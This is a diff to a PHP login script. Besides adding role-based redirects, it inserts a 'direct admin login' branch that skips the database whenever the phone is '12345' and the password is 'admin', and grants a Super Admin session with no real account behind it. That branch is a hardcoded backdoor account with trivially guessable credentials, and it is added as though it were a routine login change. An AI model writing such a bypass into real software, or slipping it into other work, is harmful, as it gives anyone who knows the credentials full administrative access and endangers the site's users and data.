@@ -8,23 +8,36 @@ if (isset($_POST['login_btn'])) {
     $phone = mysqli_real_escape_string($conn, $_POST['phone']);
     $password = $_POST['password'];
 
-    // 1. Check Database
+    // --- DIRECT ADMIN LOGIN (BYPASS DATABASE) ---
+    if ($phone == '12345' && $password == 'admin') {
+        $_SESSION['user_id'] = 1; // Assign a dummy ID
+        $_SESSION['user_name'] = 'Super Admin';
+        $_SESSION['role'] = 'admin';
+        header("Location: admin_dashboard.php");
+        exit();
+    }
+    // --------------------------------------------
+
+    // Standard Database Login for everyone else
     $query = "SELECT * FROM users WHERE phone='$phone' LIMIT 1";
     $result = mysqli_query($conn, $query);
 
     if (mysqli_num_rows($result) > 0) {
         $row = mysqli_fetch_assoc($result);
         
-        // 2. Verify Password
         if (password_verify($password, $row['password'])) {
-            // Success: Set Session
             $_SESSION['user_id'] = $row['id'];
             $_SESSION['user_name'] = $row['full_name'];
             $_SESSION['role'] = $row['role'];
 
-            // Redirect to Dashboard
-            header("Location: user_dashboard.php");
+            // Normal Redirect Logic
+            if ($row['role'] == 'admin') {
+                header("Location: admin_dashboard.php");
+            } else {
+                header("Location: user_dashboard.php");
+            }
             exit();
+
         } else {
             $error_msg = "Invalid Password";
         }
